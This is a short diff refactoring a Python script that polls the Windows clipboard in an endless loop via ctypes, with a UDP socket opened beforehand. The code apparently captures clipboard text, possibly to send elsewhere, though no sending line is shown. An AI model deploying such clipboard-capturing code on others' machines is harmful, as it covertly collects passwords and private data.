@@ -5,11 +5,12 @@ import socket
 
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
+user32 = ctypes.windll.user32
 olddata = ""
 while True:
-    ctypes.windll.user32.OpenClipboard(None)
-    clipdata = ctypes.c_char_p(ctypes.windll.user32.GetClipboardData(1)).value
-    ctypes.windll.user32.CloseClipboard()
+    user32.OpenClipboard(None)
+    clipdata = ctypes.c_char_p(user32.GetClipboardData(1)).value
+    user32.CloseClipboard()
     if clipdata == olddata:
         time.sleep(5)
     else:
